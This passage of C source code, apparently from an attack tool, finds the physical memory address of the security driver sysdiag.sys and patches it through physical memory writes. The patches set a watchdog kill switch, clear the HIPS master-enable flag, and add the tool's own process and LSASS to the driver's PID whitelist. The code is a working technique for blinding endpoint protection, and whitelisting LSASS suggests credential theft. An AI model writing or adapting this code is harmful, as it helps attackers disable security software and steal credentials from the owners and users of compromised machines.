    if(!sd_base){ printf("  sysdiag not found in module list\n"); return 0; }

    /* va_to_pa is unreliable on KPTI machines: System CR3 = shadow page table,
     * does not map driver pages. find_driver_pa_by_modpath resolves sysdiag's
     * full path via NtQuerySystemInformation, then MZ+TimeDateStamp scans RAM. */
    printf("  Locating sysdiag PA via modpath scan...\n");
    uint64_t sd_pa = find_driver_pa_by_modpath("sysdiag.sys");
    if(!sd_pa){ printf("  [!] sysdiag PA not found\n"); return 0; }
    printf("  sysdiag PA=0x%016llX\n",(unsigned long long)sd_pa);

    int ok=0;

    /* (A) Watchdog kill switch: byte_14013BDD8 = 1 */
    { uint64_t pa=sd_pa+0x13BDD8; uint8_t v=1;
      if(phys_write(pa,&v,1)){
          printf("  [A] byte_14013BDD8=1  (watchdog kill switch)\n"); ok++; }
      else printf("  [!] write byte_14013BDD8 FAIL (PA=0x%llX)\n",(unsigned long long)pa);
    }

    /* (B) HIPS master disable: dword_140077D88 &= ~2 */
    { uint64_t pa=sd_pa+0x77D88;
      uint32_t val=0; phys_read(pa,&val,4);
      uint32_t nv=val&~2u;
      if(phys_write(pa,&nv,4)){
          printf("  [B] dword_140077D88 0x%08X->0x%08X  (HIPS master off)\n",val,nv); ok++; }
      else printf("  [!] write dword_140077D88 FAIL (PA=0x%llX)\n",(unsigned long long)pa);
    }

    /* (C) PID whitelist: qword_1400FE090[0]=us, [1]=LSASS */
    { uint64_t pa=sd_pa+0xFE090;
      uint64_t our=(uint64_t)GetCurrentProcessId();
      if(phys_write(pa,&our,8)){
          printf("  [C] whitelist[0]=%llu (us)\n",(unsigned long long)our); ok++; }
      if(g_lsass_pid){ uint64_t lp=(uint64_t)g_lsass_pid;
          if(phys_write(pa+8,&lp,8))
              printf("  [C] whitelist[1]=%u (LSASS)\n",g_lsass_pid); }
    }

    if(ok>0){ printf("  [*] waiting 80ms for watchdog exit...\n"); Sleep(80); }
    return ok;
